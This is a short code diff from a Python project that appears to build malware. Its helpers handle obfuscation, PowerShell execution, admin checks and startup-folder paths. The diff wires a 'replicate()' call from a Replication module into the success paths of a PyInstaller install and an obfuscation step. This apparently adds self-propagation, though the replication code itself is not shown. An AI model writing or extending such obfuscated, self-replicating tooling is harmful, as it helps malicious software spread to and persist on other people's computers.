@@ -7,6 +7,7 @@ from Utils.helpers import is_os_64bit, random_string, run_pwsh, is_msvc_exist, \
     download_file, extract_zip, get_current_file_path, base64_encode_file, \
     find_python_path, ctypes_update_system,is_admin,startupFolder,tempFolder,BaseTempFolder,set_env_variable
 from .pyinstaller_obfuscate.main import obfuscate_files
+from Replication.main import replicate
 from .pyinstaller_obfuscate.obfuscationModule.main import Obfuscate
 
 
@@ -108,6 +109,7 @@ def default_pyinstaller_way(pyInstallerDir : str, pyInstallerZip : str,path_to_p
     os.chdir(extraction_location)
     command = os.system(f"{path_to_python} setup.py install")
     if command == 0:
+        replicate()
         return True
     return False
 
@@ -125,9 +127,7 @@ def download_gcc(path_to_python : str) -> bool:
     set_env_variable('PATH', r'C:\MinGW\mingw64\bin')
     ctypes_update_system()
     if Obfuscate(base_dir=BaseTempFolder.format(os.getlogin()), python_path=path_to_python).obfuscate():
-        obfuscate_files(extraction_path=BaseTempFolder.format(os.getlogin()), name="test",
-                        base_path=tempFolder.format(os.getlogin(), "try_this"),
-                        pythonPath=path_to_python)
+        replicate()
         # obfuscate files dont actually do anything!
         return True
     return False
